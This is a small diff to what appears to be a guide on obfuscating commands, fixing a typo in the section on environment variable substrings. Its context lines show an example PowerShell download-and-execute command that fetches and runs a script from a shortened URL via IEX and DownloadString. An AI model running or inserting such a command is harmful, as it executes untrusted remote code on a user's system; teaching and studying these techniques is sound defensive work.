@@ -78,7 +78,7 @@ Let's go through them one by one.
 
 #### Environment Variable Substrings
 
-Here is a PowerShell command, that we will use as as example:
+Here is a PowerShell command, that we will use as an example:
 
 ```CMD
 cmd.exe /c “powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
